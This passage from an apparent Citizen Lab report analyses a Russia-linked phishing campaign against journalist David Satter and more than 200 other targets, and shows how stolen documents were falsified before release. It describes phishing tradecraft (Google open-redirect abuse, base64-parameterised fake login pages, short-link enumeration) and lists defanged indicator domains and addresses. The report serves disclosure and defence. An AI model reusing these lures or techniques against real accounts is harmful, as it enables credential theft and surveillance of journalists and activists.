It provides evidence of how documents stolen from a prominent journalist and critic of Russia was tampered with and then “leaked” to achieve specific propaganda aims. We name this technique “tainted leaks.” The report illustrates how the twin strategies of phishing and tainted leaks are sometimes used in combination to infiltrate civil society targets, and to seed mistrust and disinformation. It also illustrates how domestic considerations, specifically concerns about regime security, can motivate espionage operations, particularly those targeting civil society. The report is organized into four parts described below:\nPART 1: HOW TAINTED LEAKS ARE MADE describes a successful phishing campaign against David Satter, a high-profile journalist. We demonstrate how material obtained during this campaign was selectively released with falsifications to achieve propaganda aims. We then highlight a similar case stemming from an operation against an international grantmaking foundation, headquartered in the United States, in which their internal documents were selectively released with modifications to achieve a disinformation end.  These “tainted leaks” were demonstrated by comparing original documents and emails with what Russia-linked groups later published.  We conclude that the tainting likely has roots in Russian domestic policy concerns, particularly around offsetting and discrediting what are perceived as “outside” or “foreign” attempts to destabilize or undermine the Putin regime.\nPART 2: A TINY DISCOVERY describes how the operation against Satter led us to the discovery of a larger phishing operation, with over 200 unique targets. We identified these targets by investigating links created by the operators using the Tiny.cc link shortening service.  After highlighting the similarities between this campaign and those documented by previous research, we round out the picture on Russia-linked operations by showing how related campaigns that attracted recent media attention for operations during the 2016 United States presidential election also targeted journalists, opposition groups, and civil society.\nPART 3: CONNECTIONS TO PUBLICLY REPORTED OPERATIONS outlines the connections between the campaigns we have documented and previous public reporting on Russia-linked operations. After describing overlaps among various technical indicators, we discuss the nuance and challenges surrounding attribution in relation to operations with a Russian nexus.\nPART 4: DISCUSSION explores how phishing operations combined with tainted leaks were paired to monitor, seed disinformation, and erode trust within civil society. We discuss the implications of leak tainting and highlight how it poses unique and difficult threats to civil society.  We then address the often-overlooked civil society component of nation-state cyber espionage operations.\nIntroduction: Tainted Leaks & Civil Society Targets\nRussia-linked cyber espionage campaigns, particularly those involving targeting around the 2016 U.S. elections, and more recently the 2017 French election, have dominated the media in recent months. As serious as these events are, often overlooked in both media and industry reports on cyber espionage is a critical and persistent victim group: global civil society.\nA healthy, fully-functioning, and vibrant civil society is the antithesis of non-democratic rule, and as a consequence, powerful elites threatened by their actions routinely direct their powerful spying apparatuses toward civil society to infiltrate, anticipate, and even neutralize their activities. Unlike industry and government, however, civil society groups typically lack resources, institutional depth, and capacity to deal with these assaults. For different reasons, they also rarely factor into threat industry reporting or government policy around cyber espionage, and can be the silent, overlooked victims.\nAs with previous Citizen Lab reports, this report provides further evidence of the “silent epidemic” of targeted digital attacks on civil society, in this case involving widely reported Russian-affiliated cyber espionage operations. Our report underscores the domestic roots of these foreign operations, and how concerns over regime security and domestic legitimacy can factor into Russian threat modeling and espionage targeting, both at home and abroad.\n\nPatient Zero for the Investigation: David Satter\nOur investigation began with a single victim: David Satter, a high-profile journalist, Rhodes Scholar, and critic of the Kremlin. In 2013, Satter was banned from Russia, allegedly for “flagrant violations” of visa laws, but which most attribute to his investigative reporting on Russian autocracy. Satter is known for his book, Darkness at Dawn, which investigated the possible 1999 conspiracy involving the Russian Federal Security Service (FSB) in a series of bombings of Russian apartment buildings that was used as a justification for the second Chechen War and which facilitated the rise to power of Vladimir Putin.  \nOn October 7, 2016 Satter fell victim to a targeted phishing campaign, and mistakenly entered his password on a credential harvesting site. Satter’s e-mails were stolen and later published selectively, and with intentional falsifications, as we will describe in this report. While we cannot conclusively attribute the theft of Satter’s emails to one particular threat actor, nor do we have concrete details on the process by which his stolen emails were falsified and made their way into the public domain, we uncover and analyze several pieces of evidence to help contextualize the tainted leaks, while at the same time linking the infiltration of his email to a much wider cyber espionage campaign that has a Russian nexus.\nTainted Leaks: Disinformation 2.0\nFollowing the compromise of his account, Satter’s stolen e-mails were selectively modified, and then “leaked” on the blog of CyberBerkut, a self-described pro-Russian hacktivist group. This report introduces the term “tainted leaks” to describe the deliberate seeding of false information within a larger set of authentically stolen data.\nWe examine in detail how a report sent to the National Endowment for Democracy (NED) about Radio Liberty’s Russian investigative reporting project (contained in the emails stolen from Satter) was carefully modified with false information prior to being released. We show how this manipulation created the false appearance that prominent Russian anti-corruption figures, including Alexei Navalny, were receiving foreign funding for their activities. (Alexei Navalny is a well-known Russian anti-corruption activist and opposition figure). We also note how the document was used in an effort to discredit specific reports about corruption among close associates of Russian President Vladimir Putin. \nIn addition, whoever tainted the document also made reference to an article that had not yet been published at the time the document was “leaked.” This timing strongly suggests advance knowledge of the publication of an upcoming piece of investigative journalism concerning senior Russian officials and businessmen. Such information is likely to have been sensitive, and would not have been widely known. This may suggest that the operators had access to other, ongoing surveillance operations.\nOnce the tainted leak was released, Russian state-owned media and others reported that the document showed a CIA-backed conspiracy to start a “colour revolution” in Russia.1 The tainted leak was also reported as evidence that the reports on corruption within Putin’s inner circle represented part of a deliberate disinformation campaign on behalf of foreign interests.\nThe timing and substance of the tainting coincides with reported fears among Putin and his close associates that revelations about their wealth and its sources could trigger protests and uprisings within Russia, like those lead by Navalny in recent months and years.\nTainted leaks pose complex challenges to the victims of breaches, as well as representing a potent and troubling method of disinformation.  Part 1 describes the leak tainting in greater detail, and Part 4: Discussion provides an analysis of the risks posed by the tactic.\n\nPandora’s Un-Shortening: High Value Targets Emerge\nWhile investigating the suspicious messages sent to Satter, we determined that Tiny.cc, the link-shortening service used by the operators to phish credentials, had predictable features that enabled us to discover some other links likely used by the same operators. We developed a technique to discover some of these links, and ultimately collected 223 malicious links representing 218 unique targets.2 We have been able to identify the real identity of approximately 85% of the targets. Of the set we identified, we found targets from at least 39 countries.\nOne thread that links the targets is that their professional activities connect them to issues where the Russian government has a demonstrated interest. In some cases, the targets are Russians, ranging from an ex-Prime Minister, to journalists who investigate corruption, to political activists.  Many more targets are from, posted to, or involved in extractive industries in countries and areas where the Russian government has an economic and strategic interest, such as former Soviet states.  Still others are likely to be working on issues on the other side of the negotiating table from Russia, whether as part of United Nations operations, NATO, or civil service.  Perhaps unsurprisingly, one of the largest groups of targets are high-ranking military and government personnel and elected officials in Ukraine.\nFigure 1: Map showing countries that targets of the phishing campaign are linked to [click for hi-res]\nIn other cases, for instance, the wife of a military attache, individuals appear to be targeted because of their proximity to high value targets. In others, we have identified a large number of individuals who appear to be targeted because they received support, in the form of a fellowship, from a particular US-based grantmaker.\nSome notable target categories include:\n\nPoliticians, public servants and government officials from Afghanistan, Armenia, Austria, Cambodia, Egypt, Georgia, Kazakhstan, Kyrgyzstan, Latvia, Peru, Russia, Slovakia, Slovenia, Sudan, Thailand, Turkey, Ukraine, Uzbekistan and Vietnam\nDiplomatic personnel from numerous embassies, up to and including ambassador level, as well as their family members\nCivil society members including very high profile critics of the Russian president, as well as journalists and academics\nSenior members of the oil, gas, mining, and finance industries of the former Soviet states\nUnited Nations officials\nMilitary personnel from Albania, Armenia, Azerbaijan, Georgia, Greece, Latvia, Montenegro, Mozambique, Pakistan, Saudi Arabia, Sweden, Turkey, Ukraine, and the United States, as well as NATO officials\n\nThe discovery of so many other targets provides us with a window into the campaign’s structure, and objectives (Part 2 outlines how we discovered the targets). After government targets, the second largest set (21%) are members of civil society like academics, activists, journalists, and representatives of non-governmental organizations.\n\nFigure 2: Some high-value targets who received phishing emails\nThe Importance of Civil Society Targets\nThe data presented in Figure 3 underscore the extent to which civil society groups are being targeted in numbers equivalent to those seen with the more classic ‘cyber espionage’ sector-aligned targets such as military, government, and industry.\nAmongst the civil society targets, more than half were journalists, many of whom are prominent contributors to Russian language news outlets such as Vedomosti, Slon/Republic, Novaya Gazeta, and the BBC Russian Service.\nWhile providing a detailed analysis of the civil society targets or an outline of their areas of activity would undoubtedly jeopardize their privacy, we can safely reflect on two notable patterns that emerge from such an analysis.\nThe first is that, like our first subject David Satter, several individuals from the target list were known for their public efforts towards shining a light on the Russian government and its activities. From publishing articles that outline fraud or corruption, to general activism in support of electoral reform, many of the civil society targets seem to have been singled out for the perception that their actions could pose a threat to the Putin regime.\nFigure 3: Breakdown of discovered targets into broad categories\nAnother notable commonality found during analysis of the civil society targets of these campaigns is the near perfect alignment between their areas of activity and the geopolitical conflicts in which Russia is a known or suspected belligerent, or party to the conflict.  Specifically, the focus areas of the civil society targets span geographic boundaries, including conflict areas such as Syria, Afghanistan, Ukraine, and others.\n\nWe also found that several dozen of the targeted individuals had as a thread in common that they had received a fellowship from a single funder focused on the region.\nNotification\nThe large and diverse target group presented notification challenges. Our process for notifying potential victims involved the following considerations and steps:\n\nFor targets affiliated with governments or government-affiliated organizations (such as NATO or the United Nations), or businesses in a particular country, we passed information on targets’ names and email addresses to the relevant Computer Emergency Response Team (CERT)\nIf many targets shared an organizational affiliation, but not a single employer, we contacted that organization and worked with them to notify the individuals\nWe also provided a full list of targets to the targets’ e-mail provider.\n\n\nPart 1: How Tainted Leaks Are Made\nWe examine how stolen materials from Satter’s inbox were turned into tainted leaks and released by CyberBerkut, and then examine a similar operation against the Open Society Foundations.\nTo make a clean comparison between real and fake, and illustrate exactly how tainting takes place, we obtained original, genuine documents and e-mails from David Satter, a victim of a breach, and compared them with the tainted versions. We then describe a prior case of tainted leaks: internal documents belonging to the Open Society Foundations were stolen, then later released with tainting similar to Satter’s, also by CyberBerkut.3\nIn both cases the breach victims were working with US-based organizations which had programs specializing in Russia. The tainting appeared to have two objectives: cause the programs to appear more subversive of Russia than they were, and discredit specific opposition individuals and groups critical of Russian President Putin and his confidants.\nThe Case of David Satter\nOn October 5, 2016, a phishing email was sent to the Gmail address of David Satter (See: Patient Zero: David Satter). This phishing email was crafted with a specific ruse designed to look like a security warning from Google, suggesting to the recipient that an unknown third-party has obtained their Gmail account password (see Figure 4).\nFigure 4: Phishing Email 1, mimicking a genuine message from Google\nThe phishing email is designed to trick the recipient into clicking on the ‘Change Password’ button. Clicking on this link would direct the victim’s web browser to a link hosted on the URL shortening service Tiny.cc. The operator disguised the link by using an open redirect hosted by Google. This open redirect allowed the operators to create a URL that, superficially, appears to be hosted by Google:\n\nhttps://www.google.com/amp/tiny.cc/(redacted)\n\nUnfortunately, the ultimate destination of this shortened URL was changed to a benign webpage before we were able to examine this phishing email.  However, as we will outline in Part 2 of this report, there is sufficient evidence available to suggest the original destination.\nAnalysis of the email headers revealed that the message was sent with the Russian email service Yandex, using email account g.mail2017[@]yandex.com. \nA Second Phishing Email\nTwo days later, on October 7, 2016, Satter received a second email that used an identical deception to the first attempt detailed above.\nAs with Email 1, the google.com/amp/ redirect pointed to a URL hosted by Tiny.cc. Once again, similar to Email 1, Citizen Lab found that the originally configured redirection target for this link had been removed.\nAnalysis of the email headers in this second phishing attempt show that the message was sent with the web-based email service ‘mail.com’, using email account annaablony[@]mail.com.\nFigure 5: Phishing Email 2\nUnauthorized Access\nOn October 7 2016, shortly after receiving the email, Satter reports having clicked on the change password link in Email 2, and recalls being redirected to what he now realizes was in fact a credential phishing page which appeared to be a legitimate Google sign-in page.  Unfortunately, Satter had temporarily disabled 2-factor authentication on his account, making the compromise possible.\nShortly after entering his credentials, Satter’s Gmail account activity page recorded an unauthorized login event.  The data logged by Google indicated that the login session originated from an IP address in Romania (Figure 6).  In Part 2 we will show that the server associated with this IP address was also hosting the fake Google login page where Satter submitted his account credentials.  Thus it is likely that this malicious server was configured to automatically download the email contents from any compromised accounts (see Figure 7).\nFigure 6: Screen grab from Google account activity page\nIn Part 2 of this report we will outline how the phishing links sent to Satter led us to discover a much wider campaign that included 218 distinct targets from government, industry, military, and civil society.  In the following section, we provide context concerning the disinformation campaign that was conducted around material stolen from Satter’s email account and published on the blog of CyberBerkut, a pro-Russian hacktivist collective.\nFigure 7: How a phishing campaign against Satter became a tainted leaks operation\nAnalyzing a Tainted Leak\nThis section compares an original document obtained by Citizen Lab with a tainted document published online, and used as part of a disinformation campaign. We describe the tainting in detail, and analyse the likely objective.\nSeveral documents from Satter’s emails were posted by CyberBerkut at the same time without observable manipulation. However, one document showed extensive evidence of tainting. The tainted leak was a report authored by Satter describing Radio Liberty’s Russian Investigative Reporting Project. The document was modified to make Satter appear to be paying Russian journalists and anti-corruption activists to write stories critical of the Russian Government. Importantly, we do not know the process through which the stolen document made its way from Satter’s inbox to the CyberBerkut release. In the CyberBerkut version, the document is posted as screen-captures, and thus lacks metadata.\nFigure 8: CyberBerkut post dated October 22, 2016 showing the narrative accompanying the tainted leak document (highlighted with arrow). [Archived copy]The original document lists a series of articles from Radio Liberty exclusively that are part of the project.  The articles concern a range of topics: history, economics, and politics.  Radio Liberty is a U.S. government international broadcaster, founded in 1951 to broadcast news and information into the Soviet Union.  It merged with Radio Free Europe in 1976, who now together are incorporated as a 501(c)(3), funded and overseen by the United States’ Broadcasting Board of Governors. \nThe tainted document modifies the text to appear to be a report on a much larger (nonexistant) project to pay for articles by a range of authors, which would subsequently be published by a range of media outlets. The deceptively inserted articles, almost all of which are genuine publications, focus on corruption within Putin’s friends and inner circle. The work of Alexei Navalny, a prominent Putin critic, is repeatedly emphasized.  The full tainted document is in Appendix A.\nTaint 1: Making reporting look like a secret influence operation\nThe operators modified the document’s scope in an attempt to create the appearance of a widespread media campaign. They did this by removing or modifying mentions of Radio Liberty throughout the document.\nFigure 9: Text in red was removed, creating the impression of a wide media campaign, not the programming of a specific news source.\nOther content, such as discussions of specific translators working for Radio Liberty are similarly removed to preserve the fiction.\nFigure 10: The document was further tweaked to create the impression of a larger campaign. A note about a translator was also removed as it would contradict the impression\nWe believe that by removing specific references to Radio Liberty, the perpetrators are aiming to give the impression of a broader subversive campaign not limited to a single news organization. Doing so allows the perpetrators to falsely associate non-US funded organizations, such as independent NGOs, to appear to be linked as part of this larger, fictitious program.\nFigure 11: Further tainting to remove mentions of Radio Liberty\nFinally, a clause is deleted at the end of the document concerning the risks of writing “without the protection of a full time job” (Figure 11).  This deletion may simply be the tainters removing an inconvenient sentence that refers to Radio Liberty, but it also may be an attempt to make the  activity look more “cloak and dagger.”\nTaint 2: Discrediting specific journalists and Kremlin critics\nThe original document included a list of 14 articles published as part of the Russian Investigative Project at Radio Liberty. The tainted document includes 24. The operators not only added to the list, but also tweaked the Radio Liberty articles to further the impression of a larger campaign.\nFigure 12: Six of the ten added articles. All blue text was added to the original as part of the tainting.  The objective is to make these reports appear to have been supported by the project.\nTen additional articles were added.  Although the original list of publications covered a variety of themes, the added set primarily focuses on issues of corruption, and the wealth of those in Putin’s circle.  The articles, written for a range of publications, all share a theme: corruption and personal enrichment by those close to Putin and the Russian Government (See Appendix A).\nFigure 13: People and Topics of articles added in the tainting.  Images: Wikipedia, Radio Free Europe, Reuters [click for hi-res]Of special interest are the insertions of Alexei Navalny, a prominent Russian anti-corruption activist and opposition figure whose work, and Anti-corruption Foundation, receives widespread domestic and international attention. By repeatedly adding his reporting to the document, the tainting creates the appearance of “foreign” funding for his work.  This theme also figured prominently in the disinformation campaign surrounding the original publication, on October 22, 2016, of the tainted document by CyberBerkut (See: Disinformation Campaign Surrounding the Tainted Document).\nTaint 3: Claimed foreknowledge\nAn article by Russian journalist Elena Vinogradova describing issues involving “senior Russian officials and businessmen” was also added as part of the tainting, which goes on to state that it will be published by Russian-language news service Vedomosti on October 24-25.4\nFigure 14: Tainting that suggests the operators had advanced knowledge of a news report\nThis timing is significant as the original CyberBerkut publication of the tainted document occurred on October 22 2016, slightly before this date.\nThe apparent foreknowledge suggests that the individuals responsible for the tainting had advance knowledge of the content and publication date of a piece of investigative journalism, which may mean the operators had access to intelligence or surveillance reports concerning the activities of the Elena Vinogradova.\nWe identified at least one individual among the set of targets of the phishing campaign whose account might have provided this information, however we were not able to confirm a compromise. \nImportantly, we were not able to find concrete evidence of the publication of an article matching the description added in the tainting. It is possible that existence of the article was a fabrication, or the result of misplaced speculation by the individuals responsible for the tainting.\nTaint 4: Modifying the Time Frame and Supporting Details\nThe timeframe and number of publications are increased, perhaps to give the impression of a longer and more intense campaign. Changes are also made to accommodate a wide range of articles not published by Radio Liberty but by other parties.\nFigure 15: Dates and numbers changed to accommodate ten more articles\nText that mentions specific dates in the original document that would not accommodate the articles that have been falsely added is also changed to support the new fiction.\nDisinformation Campaign Surrounding the Tainted Document\nThe tainted version of the stolen document was released online by CyberBerkut, which represents itself as a group of pro-Russian hacktivists. CyberBerkut provided the framing narrative for the tainted document in a post on October 22, 2016: they were releasing the document to provide evidence that the United States was attempting to support a “colour revolution” in Russia. In the CyberBerkut narrative, David Satter was an agent directing the publication of articles critical of the Russian government.\nFigure 16: RIA Novosti, Russia’s state operated news agency, reporting the Cyber Berkut’s release of the tainted leaks\nRussia’s state operated news agency RIA Novosti, as well as Sputnik Radio, picked up the narrative, and gave voice to a number of sources who claimed that the “leak” was evidence that the United States Central Intelligence Agency (CIA) was attempting to foment a “colour revolution.”  The document was cited in a RIA Novosti report as providing evidence of “over 20” reports intended to discredit the Russian president, and his entourage. The “colour revolution” narrative was echoed in this SM News report, and by Vesti.lv, among others.\nMeanwhile, other Russian-language sources claimed that the document discredited Navalny’s Anti-corruption Foundation by showing that its articles were actually ordered by David Satter.\nThe Open Society Foundations Case\nIn 2015, the Open Society Foundations (OSF) experienced a breach of confidential data.  Materials from this breach were released by CyberBerkut in November 2015 and, much later, on the “leak” branded site DC Leaks, alongside a wide range of materials stolen from other organizations. DC Leaks worked directly with some online outlets, and provided exclusive access to their materials to some, as well as achieving substantial media impact.\nThe redundant releases enable a comparison of documents between the two leaks using public materials. The DC Leaks dump included the release of untainted stolen documents that had been previously released as part of a tainted leak by Cyber Berkut.  An article in Foreign Policy used this dump to identify several cases of leak tainting. We were able to verify each of their observations, as well as identifying additional elements of tainting.  \nWe then contacted OSF’s IT staff, who provided us with the original genuine documents which we were able to use as the basis for further comparisons, and to authenticate the documents posted on DC Leaks. Taken together, the tainting appears designed to create the impression that several groups and media outlets, including Alexei Navalny’s Foundation for Fighting Corruption, are supported by OSF.  \nAs with the Satter case, the tainting appears to have a primarily domestic focus, and to be aimed at de-legitimizing figures like Navalny by making it appear that they are the recipients of illicit, foreign funding.  This is a view that Navalny, one of the targets of the tainting, has also expressed to Foreign Policy. \nA Budget Document\nFirst, CyberBerkut released a tainted budget document to make it appear as if OSF was funding Alexei Navalny’s Foundation for Fighting Corruption.\nFigure 17: Tainted Budget Document: the second row was added to make it appear as if OSF was funding Navalny’s Foundation for Fighting Corruption\nThe tainters may have been working quickly, resulting in a small error, in which a dollar amount was substituted for “Approved Date.”\nProposed Strategy Document\nSecond, a proposed funding strategy document was similarly modified to include the Foundation for Fighting Corruption in a list of groups to receive OSF support.\nFigure 18: Proposed Strategy Document showing the location where the tainted document is modified to include mention of the Foundation for Fighting Corruption\nThe tainting resumed later in the document, when several media outlets (Echo Moscow, RosBusinessConsulting, and Vedomosti)  were also added to the document, apparently to create the perception that they had received the support of OSF.\nFigure 19: A second section in the same document showing once more how several media outlets, including Echo Moscow, RosBusinessConsulting, and Vedomosti have been added.\nThe second instance of tainting in the strategy document also introduced a slight grammatical error when the tainters neglected to remove “an” before changing “news site” to the plural “news sites.”\nDocument Addressing the NGO Law\nFinally, in a document addressing grantees and Russia’s NGO law, tainting was again performed to add Navalny’s Foundation for Fighting Corruption. The tainting also purported to show the foundation receiving money via Yandex, a widely-used Russian platform offering an online payment service.\nFigure 20: Tainted document, once more showing the addition of Navalny’s Foundation for Fighting Corruption\nTaken together, both the tainted document stolen from David Satter, and the tainted OSF documents paint a picture of a competent adversary working to achieve several objectives, including discrediting domestic critics of Russia’s government and president, while simultaneously attempting to embarrass foreign funders with activities in Russia. In Part 4 we discuss the significance of tainted leaks as a disinformation technique.\n\nPart 2: A Tiny Discovery\nBeginning with the shortened link sent to David Satter, we identified a predictable feature in how the link shortener (Tiny.cc) generated its shortened URLs. This enabled us to identify over 200 additional targets of the same operation described in Part 1. This section describes the process used to enumerate these targets, and further describes the links between this operation and other publicly-reported Russian-linked phishing campaigns.\nIn September 2016, ThreatConnect published a blog post documenting phishing attempts against contributors to the citizen journalism website Bellingcat and its founder Eliot Higgins. The targeted contributors were actively engaged in reporting on the Russian involvement in the July 17, 2014 downing of Malaysia Airlines Flight 17. ThreatConnect attributed these intrusion attempts to Fancy Bear (aka APT28), a threat actor widely believed to be directly linked to the Russian government.  In an October update to this post, ThreatConnect documented an additional spear phishing attempt against a Bellingcat contributor.\nThis latest credential phishing attempt was largely similar to the first email sent to David Satter (see Part 1, The Case of David Satter). Both emails were sent at 10:59am EST using the same sending address: g.mail2017[@]yandex.com. In addition, both shared a fake Gmail footer that was distinctively modified from Gmail’s original footer.\nFigure 21: Footer from the phishing emails sent to Bellingcat and David Satter showing a distinctive misspelling (possibly to avoid spam filtering)\nIn both cases the malicious links embedded in these phishing emails were configured to redirect the targets to addresses hosted on the URL shortening service Tiny.cc. As ThreatConnect showed, the Tiny.cc link used against the Bellingcat contributor actually redirected the victim to another shortened URL, this one hosted by a different shortening service: TinyURL.com.  Ultimately, this series of link redirections led to a malicious credential phishing page hosted at the following URL:\nhxxp://myaccount.google.com-changepassword-securitypagesettingmyaccountgooglepagelogin.id833[.]ga\nTable 1: Domain hosting the credential phishing page\nUsing PassiveTotal, we examined the historic DNS resolution data for this domain name.  The results revealed that at the time of these phishing attempts, the domain id833[.]ga resolved to IP address 89.40.181[.]119 – the same Romanian IP address used to access David Satter’s email account on October 7 (see Part 1, The Case of David Satter). \nThis evidence suggests that the Bellingcat contributor and David Satter were both targeted by the same spear phishing campaign; this linkage will be explored further in the next section.\nTiny.cc Enumeration\nIn examining the Tiny.cc shortened URLs found within the spear phishing emails sent to David Satter, we became curious as to the structure of how such links were constructed.\nTiny.cc provides a shortening service which allows users to create succinct URLs that redirect to some defined, usually long, website address. By way of example, we created a Tiny.cc shortened URL which redirects to a recent Citizen Lab report:\nhttp://tiny.cc/bj87iy  -> https://citizenlab.org/2017/02/bittersweet-nso-mexico-spyware/\nIn this example, the Tiny.cc shortcode would be bj87iy. In the Tiny.cc application back-end database, this hash uniquely resolves to the target address of:\nhttps://citizenlab.org/2017/02/bittersweet-nso-mexico-spyware/\nAfter conducting tests, we determined that these shortcodes are assigned in a sequential manner. For example, using the Tiny.cc API call for creating a shortened URL, we programmatically generated 8 links with a one-second delay between each call. The resulting shortcodes generated (in order) were as follows:\n63q6iy\n73q6iy\n93q6iy\ne4q6iy\np4q6iy\nr4q6iy\nt4q6iy\n24q6iy\nAfter conducting numerous similar tests, we determined that shortcodes constructed within small temporal windows would be lexically close in the sense of the following ‘base36 alphabet’ sequence:\na,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,0,1,2,3,4,5,6,7,8,9\nSuccessive shortcodes are constructed by iterating the leftmost character through this base36 alphabet. Once all 36 characters have been exhausted, this leftmost character reverts to the initial value of ‘a’, with the second character then iterating one position according to the same alphabet. This iterative process continues for each position of the shortcode (see Figure 22), enabling us to consider the shortcodes as a sort of base36 ‘counter’.\nFigure 22: Enumerating the base36 shortcodes used by tiny.cc\nGiven this understanding of the shortcode design, we can measure the notional ‘distance’ between any pair of shortcodes.  For example, the distance between the shortcodes  bj87iy and cj87iy would be 1, and the distance between bj87iy and bk87iy would be 36.\nThis distance measurement gives an idea of how close two shortcodes are, and thus by extension, how close in time they were generated. We will revisit this notion of distance below.\nUsing this design knowledge, we considered the Tiny.cc shortcodes found in the October 5 and 7 phishing emails sent to David Satter. Using these as a starting point, we enumerated approximately 4000 adjacent shortcodes for each, and then examined the target web addresses to which these short links redirected.  From this large list, we extracted all of the associated destination links (see Figure 23) which redirected to the malicious phishing domain described above in Table 1.\nFigure 23: Some of the phishing links discovered during enumeration of the Tiny.cc shortcodes\nThis enumeration led us to discover evidence suggesting that David Satter and the unnamed Bellingcat journalist were but two targets of a much larger credential phishing campaign. Notably, as mentioned above in Part 1: A Second Phishing E-mail, when we checked the particular Tiny.cc shortcode received by Satter, the unshortened link to the phishing page had been replaced with a benign URL: myaccount.google[.]com.  \nWe were unable to conclusively determine the reason for this substitution. One theory suggests that the campaign operators mistakenly shortened incorrect destination URLs, while another posits that once the operators had successfully compromised a target’s account, they would inoculate the Tiny.cc link provided in the phishing email. Indeed, in the same batch of enumerated shortcodes from the October campaign, we found four additional shortcodes which also pointed to myaccount.google[.]com. \nDecoding the targets\nWe examined the “unshortened” URLs of shortcodes that were adjacent to the one sent to Satter, and discovered 25 distinct destination addresses of the form:\nhttps://www.google.com/amp/tinyurl.com/(redacted)\nThese addresses were redirects which leveraged the previously mentioned, Google-hosted, open redirect page (google.com/amp/) to send a user to a link on the TinyURL.com shortening service. In every case, these TinyURL.com links were each designed to send their intended victims to a tailored version of the following, fake, Gmail login page:\nhxxp://myaccount.google.com-changepassword-securitypagesettingmyaccountgooglepagelogin.id833[.]ga/security/signinoptions/password\nThis domain, discussed above and noted in Table 1, at the time the phishing emails were sent, resolved to the Romanian IP address used to access Satter’s Gmail account (see Part 1).\nIn order to bolster the social engineering aspect of these fake Gmail login pages, the operator used a series of base64-encoded URL parameter values in order to display the target’s email address, and in some cases the target’s name and Google profile image, into the appropriate fields on the fake login page.\nFigure 24: TinyURL preview of a second level redirect of a phishing link\nThe following example URL illustrates the use of these parameters (Figure 25):\nFigure 25: URL parameter decoding from a phishing link\nBy virtue of this pattern of URL parameters, we were able to determine the precise target of each of the phishing links we discovered during our enumeration process.  The significance of this pattern of URL parameters will be revisited below in Part 3. \nDigging Deeper\nExtending the search for suspicious URLs by fully enumerating the entire six-character shortcode sequence space in the above manner proved to be intractable.5 However, the same ThreatConnect report discussed above also documented a previous APT28-attributed phishing attempt against Bellingcat journalist Aric Toler. On June 16, 2016, Toler was sent a strikingly similar Google-themed phishing email containing a Tiny.cc shortcode. Following the same process outlined above, we enumerated the shortcodes adjacent to the one published by ThreatConnect.\nIn doing so, we discovered another group of targets – 198 target email addresses in total. In this earlier campaign, the unshortened URLs pointed directly to the likely phishing page (Figure 26):\nFigure 26: URL parameters in June campaign against Aric Toler\nNotably, these links appear to be hosted on the Google Blogger service, and while these pages were already taken offline when we attempted to examine them, the same characteristic URL parameterization can be observed.\nA brief analysis of the target list associated with these two campaigns is provided above (see Pandora’s Un-Shortening: Civil Society Targets Emerge).\n\nTesting the Lure\nWe measured the distance between successive malicious Tiny.cc shortcodes seen in the June and October campaigns (Figure 27). In doing so, we observed fairly consistent distances between the shortcodes, perhaps indicating that the operators were generating these links via an automated process. However, one shortcode stood out, and we suspected this may have been a manual operator test.\nFigure 27: The anomalous distance of 305 immediately stood out from the average of 8.2, drawing our attention to the shortened link\nAccording to the parameters obtained from the phishing URL associated with this anomalous shortcode, we were able to decode the Gmail account targeted with this phishing link:\n\n\n\nParameter\nResult after decoding\n\n\nEmail Address\nmyprimaryreger[@]gmail.com\n\n\nFull Name\nÅhlén خسروي\n\n\nGoogle+ Profile Picture\n\n\n\n\nTable 2: URL parameter values decoded\nThis Google account, myprimaryreger[@]gmail.com, was also used in the registration of at least one other domain name which was linked in prior research to known or suspected APT28 activity.  Such connections, while circumstantial, further support the link to Russia-based threat actors.\nIn Appendix B we provide a brief description of why we think the account is being used by the operator, and how the account uses Google Plus posts to embed images into phishing e-mails.\n\nPart 3: Connections to Publicly Reported Operations\nThis section outlines the connections and overlaps between the operation described in this report and other, publicly-reported Russian-affiliated cyber espionage campaigns. \nThe operator test uncovered during our enumeration of the Tiny.cc shortcodes (see Testing the Lure above), provides a circumstantial link to APT28, however there are other potential links. In this section, we outline other comparisons between this campaign and other publicly reported operations that have a Russian nexus. We identify marked similarities to a collection of phishing links now attributed to one of the most publicly visible information operations in recent history: the targeting of the 2016 US Presidential Campaign.\nA Bit More Abuse\nThe phishing URLs in this campaign were encoded with a distinct set of parameters using base64. When clicked, the links provided key information about the targets to the phishing website. An identical approach to parameters and encoding (see Figure 28 below) has been seen before: in the March 2016 phishing campaign that targeted Hillary Clinton’s presidential campaign and the Democratic National Committee. This similarity suggests possible code re-use: the two operations may be using the same phishing ‘kit’.\nThe campaign that targeted the DNC also included the same Google security-themed phishing ruse, and abused another URL shortening service, Bit.ly.  In June 2016 Dell SecureWorks published a report attributing the operation to APT28, a threat actor routinely associated with the Russian government.  \nSecureWorks researchers were able to enumerate and analyze the targets of this campaign, thus allowing them to describe the victimology:\n“individuals in Russia and the former Soviet states, current and former military and government personnel in the U.S. and Europe, individuals working in the defense and government supply chain, and authors and journalists — but also included email accounts linked to the November 2016 United States presidential election”\nThis victimology strikes an immediate parallel to the target listing we have uncovered in our enumeration of the Tiny.cc URLs.\nFigure 28: Bitly link and ultimate phishing page address sent to John Podesta, former chairman of the Hillary Clinton presidential campaign, in March 2016\nDomain Schema Commonalities\nWe found similarities in domain naming, and subdomain structures, between this campaign and operations linked to APT28.\nThe domain used in the campaign targeting Satter was id833[.]ga.  At the time of the campaign, this domain name was pointed to a server at IP address 89.40.181[.]119.  Using PassiveTotal, we observed other domain names sharing a similar naming scheme also directed at this IP: id834[.]ga, and id9954[.]gq.  While we did not observe any phishing links for these alternate domains, there were identical subdomains registered for both:\n\n\n\nDomain\nSub-Domain\n\n\nid833[.]ga\nmyaccount.google.com-changepassword-securitypagesettingmyaccountgooglepagelogin\n\n\nid834[.]ga\nmyaccount.google.com-changepassword-securitypagesettingmyaccountgooglepagelogin\n\n\nid9954[.]gq\nmyaccount.google.com-changepassword-securitypagesettingmyaccountgooglepagelogin\n\n\n\nThis domain / subdomain naming schema is also extremely close to one featured in Mandiant’s 2017 M-Trends report, in a phishing operation, linked to APT28, which targeted OAuth tokens in an effort to obtain persistent access to a victim’s Google account, and to bypass the security of two-factor authentication.\nDomain linked to this campaign:\nmyaccount.google.com-changepassword-securitypagesettingmyaccountgooglepagelogin.id833[.]ga\nDomain mentioned by Mandiant, linked to APT28:myaccount.google.com-changepassword-securitypagesettingmyaccountgooglepage.id4242[.]ga\nThe similarities in naming and subdomain structure are immediately apparent.  The two domains (id833[.]ga and id4242[.]ga) also share a common name server.  However, we were not able to find specific registration overlaps between the domains or servers.   